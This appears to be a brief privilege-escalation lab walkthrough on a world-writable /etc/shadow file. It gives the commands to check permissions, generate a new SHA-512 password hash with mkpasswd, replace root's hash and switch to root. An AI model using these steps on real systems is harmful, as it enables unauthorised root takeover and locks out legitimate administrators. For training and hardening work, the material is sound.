# Weak File Permissions - Writable /etc/shadow

`ls -l /etc/shadow`

Generate a new password hash with a password of your choice:

`mkpasswd -m sha-512 newpasswordhere`

Edit the /etc/shadow file and replace the original root user's password hash with the one you just generated.

Switch to the root user, using the new password:

`su root`
